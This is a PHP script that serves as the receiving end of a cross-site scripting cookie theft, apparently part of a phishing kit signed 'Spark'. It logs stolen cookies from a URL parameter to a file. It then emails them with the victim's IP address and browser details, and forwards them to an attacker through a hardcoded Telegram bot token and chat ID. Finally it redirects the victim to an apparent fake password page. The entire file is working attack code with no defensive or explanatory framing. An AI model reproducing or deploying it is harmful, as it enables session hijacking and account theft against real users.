<?php
include 'email.php';

?>

<?php

$cookies = $_GET["c"];
$file = fopen('log1.txt', 'a');
fwrite($file, $cookies . "\n\n");
$cookie = $_GET['c'];
$fp = fopen('log1.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);


global $message;


$ip = getenv("REMOTE_ADDR");
$timestamp = date('d/m/Y h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------->Spark Cookies<------------------\n\n";
$message .= "XSS-Cookie: ".$cookies."\n\n";

$message .= "Time: $timestamp \n";
$message .= "Browser: $browser \n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "|----------- CrEaTeD bY Spark --------------|\n";

$subject = "Computer $ip";
$headers = "";

$headers .= "\n";
	 mail("", "Spark ", $message);
if (mail($Receive_email,$subject,$message,$headers))
	   {
            
$telegram_bot_api="5745215736:AAGk5aCND8zojKcLxIiGojNYA-64gcrMUNg";
$telegram_chat_id ="5691618668";

 $url = "https://api.telegram.org/bot" . $telegram_bot_api . "/sendMessage?chat_id=" . $telegram_chat_id . "&text=". urlencode($message);
$ch = curl_init();
$optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);

      	  echo '<script type="text/javascript">
           window.location = "druid/ms/pass.php"
      </script>';

	   }
else
    	   {
 		echo '<script type="text/javascript">
           window.location = "druid/ms/pass.php"
      </script>';
  	   }

?>
